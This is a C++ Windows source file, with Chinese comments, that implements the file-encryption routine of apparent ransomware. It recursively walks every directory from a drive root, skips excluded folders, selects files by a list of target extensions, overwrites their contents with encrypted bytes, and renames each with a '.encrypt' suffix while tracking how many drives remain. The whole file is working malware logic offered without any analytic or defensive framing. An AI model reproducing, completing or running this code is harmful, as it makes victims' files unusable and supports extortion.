#define _CRT_SECURE_NO_WARNINGS
#include "entrypt_file.h"
#include "encryp.h"
#include "utils.h"

#include<filesystem>
#include<fstream>
#include<algorithm>
#include<atomic>

extern std::vector<std::wstring> kExcludeDir;
extern std::vector<std::wstring> kIncludeBackfix;

extern std::atomic_uint32_t harddriver_count;

void encrypt_file_recursive(const std::wstring &path, bool root) {
  WIN32_FIND_DATA fd{};
  HANDLE h = INVALID_HANDLE_VALUE;
  bool b = false;

  if (!SetCurrentDirectoryW(path.c_str())) {
    return;
  }

  std::wstring file_name = path;
  file_name.append(L"\\*.*");

  HANDLE hFind = ::FindFirstFileW(file_name.c_str(), &fd);
  if (hFind != INVALID_HANDLE_VALUE) {
    WCHAR file_full_path[MAX_PATH]{};

    do {
      //先把目录拷贝进去,再拷贝文件名
      wcscpy_s(file_full_path, path.c_str());
      if (!root) wcscat_s(file_full_path, L"\\");
      wcscat_s(file_full_path, fd.cFileName);

      std::error_code er{};
      if (std::filesystem::is_directory(file_full_path, er)) {
        // 排除指定目录
        bool Exclude = false;
        for (auto Dir : kExcludeDir) {
          if (findStringIC(file_full_path, Dir)) {
            Exclude = true;
            break;
          }
        }
        if (fd.cFileName[0] != L'.' && !Exclude)
          encrypt_file_recursive(file_full_path, false);

      } else  //是文件,执行文件加密
      {
        // 判断后缀
        std::filesystem::path p(file_full_path);
        bool BackfixInclude = false;
        for (auto &backfix : kIncludeBackfix) {
          if (p.extension() == backfix) BackfixInclude = true;
        }

        if (!BackfixInclude) continue;

        printf("%ws\n", file_full_path);

        h = CreateFileW(file_full_path, FILE_WRITE_ACCESS,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
          goto cleanup;
        }

        uint32_t file_size = GetFileSize(h, 0);
        if (!file_size) goto cleanup;

        uint8_t *fb = new uint8_t[file_size];

        DWORD bytes_read;
        b = ReadFile(h, fb, file_size, &bytes_read, 0);
        if (!b) {
#ifdef _DEBUG
          printf("-- 读文件失败 原因:   ");
          DisplayError(GetLastError());
#endif  // _DEBUG
        }

        encrypt_file(fb, file_size);

        b = WriteFile(h, fb, file_size, &bytes_read, 0);
        if (!b) {
#ifdef _DEBUG
          printf("-- 写文件失败 原因:   ");
          DisplayError(GetLastError());
#endif  // _DEBUG
        }

        delete[] fb;
      }

    cleanup:

      if (h != INVALID_HANDLE_VALUE) {
        CloseHandle(h);

        // 重命名
        b = MoveFileW(
            file_full_path,
            ((std::wstring)file_full_path).append(L".encrypt").c_str());
        if (!b) {
#ifdef _DEBUG
          printf("-- 重命名失败 原因:   ");
          DisplayError(GetLastError());
#endif  // _DEBUG
        }
      }

      RtlZeroMemory(file_full_path, sizeof(file_full_path));

    } while (::FindNextFileW(hFind, &fd));
    ::FindClose(hFind);
  }
  if (root) harddriver_count--;
}